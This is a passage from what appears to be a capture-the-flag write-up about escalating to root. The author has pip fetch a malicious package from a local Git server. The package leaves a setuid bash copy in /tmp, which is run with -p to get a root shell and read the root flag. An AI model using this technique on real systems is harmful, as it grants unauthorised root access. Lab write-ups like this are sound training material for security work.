Collecting http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz
  Downloading http://127.0.0.1:3000/john/Test/raw/master/own_this_is_for_you-0.0.1.tar.gz (821 bytes)
  Saved ./own_this_is_for_you-0.0.1.tar.gz
Successfully downloaded own-this-is-for-you

```

Now `/tmp/0xdf` is `bash`, which I can run with `-p` to keep root:

```

john@only4you:~$ /tmp/0xdf -p
0xdf-5.0# 

```

And read the root flag:

```

0xdf-5.0# cat root.txt
c9b85bc4************************

```